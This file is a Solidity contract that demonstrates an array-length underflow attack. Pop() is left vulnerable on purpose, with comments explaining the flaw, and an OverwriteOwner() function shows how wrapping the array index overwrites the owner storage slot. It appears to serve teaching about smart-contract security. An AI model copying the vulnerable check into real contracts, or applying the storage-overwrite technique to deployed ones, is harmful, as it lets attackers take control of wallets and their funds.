// SPDX-License-Identifier: MIT
pragma solidity ^0.4.25;

contract Wallet {
    bytes32 public arrayStartAddress;
    bytes32 public ownerAddress;
    address public owner;
    uint[] public dynamicArray;
   
    constructor() public {
        dynamicArray = new uint[](0);
        owner = msg.sender;
    }

    function () public payable {
    }

    function Length() public view returns(uint) {
        return dynamicArray.length;
    }

    function Push(uint c) public {
        dynamicArray.push(c);
    }

    function Pop() public {
        //  Ensure dynamic data structures don't exceed bounds (Over or Under)
        //  Proper check (Avoids underflow wrapping to 2^256 - 1)
        // require(0 < dynamicArray.length); 

        //  Vunerable to attack (Wraps to 2^256 allowing access to almost entire storage space)
        require(0 <= dynamicArray.length);
        dynamicArray.length--;
    }

    function Insert(uint index, uint value) public {
        require(index < dynamicArray.length);
        dynamicArray[index] = value;
    }

    function Destroy() public {
        require(msg.sender == owner);
        selfdestruct(msg.sender);
    }

    //  This function would be performed outside the contract and the attacker would only interact with Pop() and Insert()
    function OverwriteOwner() public{
        //  Length of Array must overflow before call
        require(dynamicArray.length == 2**256 - 1);

        //  Calculate the starting memory address of dynamic array
        //  In this example starting address is 0x3 (Fourth variable delcared)
        //  Use keccak256(abi.encode("0x3")) or web3.utils.sha3("0x3")
        arrayStartAddress = keccak256(abi.encode(0x3));

        //  From the address previously calculated wrap around to the address you wish to overwrite (in this case it is the owner "3rd variable")
        //  (2^256 - ARRAY_START + OVERWRITE_VARIABLE_ORDER)
        ownerAddress = bytes32(2**256 - 0xc2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f71f85b + 2);
        Insert(uint256(ownerAddress), uint256(0x0));
    }
}